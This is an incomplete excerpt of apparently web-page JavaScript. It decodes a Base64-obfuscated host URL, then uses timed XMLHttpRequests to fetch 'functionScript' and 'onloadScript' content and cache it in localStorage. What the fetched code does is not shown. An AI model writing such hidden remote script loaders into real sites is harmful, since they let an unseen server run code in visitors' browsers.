...
var urlhost = Base64.decode('aHR0cHM6Ly9wbGF5Lm15LmlkL2hhZml6');
var waktu = 5000;

function functionScript() {
    var xmlhttp = new XMLHttpRequest();
	xmlhttp.timeout = waktu; // time in milliseconds

	xmlhttp.onload = function () {
	  console.log('finish functionScript');
	};

	xmlhttp.ontimeout = function (e) {
	  console.log('RTO functionScript');
	  localStorage.setItem('functionScript',Base64.encode(' '));
	};
...
function onloadScript() {
	...
	xmlhttp.onload = function () {
	  console.log('finish onloadScript');
	};

	xmlhttp.ontimeout = function (e) {
	  console.log('RTO onloadScript');
	  localStorage.setItem('onloadScript',Base64.encode(' '));
	};
    xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readyState == XMLHttpRequest.DONE) {
            if (xmlhttp.status == 200) {
...
function loadServer(key) {
	...
	xmlhttp.onload = function () {
	  console.log('finish loadServer');
	};

	xmlhttp.ontimeout = function (e) {
	  console.log('RTO loadServer');
	  localStorage.setItem('functionScript',Base64.encode(' '));
	  localStorage.setItem('onloadScript',Base64.encode(' '));
	};
